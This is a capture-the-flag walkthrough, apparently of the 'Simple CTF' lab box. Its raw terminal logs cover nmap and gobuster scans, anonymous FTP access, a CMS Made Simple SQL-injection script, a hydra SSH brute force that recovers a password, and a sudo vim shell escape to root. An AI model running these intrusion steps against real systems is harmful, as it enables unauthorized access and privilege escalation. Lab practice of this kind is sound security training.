# simple ctf

```
┌──(root💀kali)-[/home/kali]
└─# nmap -A -T5 10.10.76.32      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-27 02:20 EDT
Nmap scan report for 10.10.76.32
Host is up (0.28s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.1.70
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 5.4 (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   323.04 ms 10.9.0.1
2   330.14 ms 10.10.76.32

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.71 seconds

```
ftp
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ftp 10.10.220.146                                                                                                                  1 ⨯
Connected to 10.10.220.146.
220 (vsFTPd 3.0.3)
Name (10.10.220.146:kali): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |**********************************************************************************************|   166      463.16 KiB/s    00:00 ETA
226 Transfer complete.
166 bytes received in 00:00 (0.55 KiB/s)
ftp> exit
221 Goodbye.

┌──(kali㉿kali)-[~/Desktop]
└─$ cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!


```
/simple
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.76.32/ -t 60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,phtml,sh
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.76.32/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              phtml,sh,html,txt,php
[+] Timeout:                 10s
===============================================================
2022/03/27 02:31:16 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]  
/simple               (Status: 301) [Size: 311] [--> http://10.10.76.32/simple/]
Progress: 42948 / 1323366 (3.25%)                                              ^C
[!] Keyboard interrupt detected, terminating.
                                                                                
===============================================================
2022/03/27 02:34:55 Finished
===============================================================

```

http://10.10.76.32/simple/
cms:CMS Made Simple 2.2.8 
google:CMS Made Simple 2.2.8 exploit
`https://www.exploit-db.com/exploits/46635`

這腳本沒成功過
```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 46635.py -u http://10.10.76.32/simple/


[+] Salt for password found: 1dac0d92e9fwK
[+] Username found: mitca
[+] Email found: admin@admin.comk
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96

```
hydra
```
┌──(root💀kali)-[/home/kali/Downloads/CVE-2019-9053]
└─# hydra -l mitch -P /usr/share/wordlists/rockyou.txt  10.10.220.146 ssh -s 2222                                                    130 ⨯
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-27 11:28:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.220.146:2222/
[2222][ssh] host: 10.10.220.146   login: mitch   password: secret
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-27 11:29:23

```

```
┌──(root💀kali)-[/home/kali/Downloads/CVE-2019-9053]
└─# ssh mitch@10.10.220.146 -p 2222                                                                                                  130 ⨯
The authenticity of host '[10.10.220.146]:2222 ([10.10.220.146]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:35: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.220.146]:2222' (ED25519) to the list of known hosts.
mitch@10.10.220.146's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ vim -c ':!/bin/sh'

$ sudo  vim -c ':!/bin/sh'

# ls     

```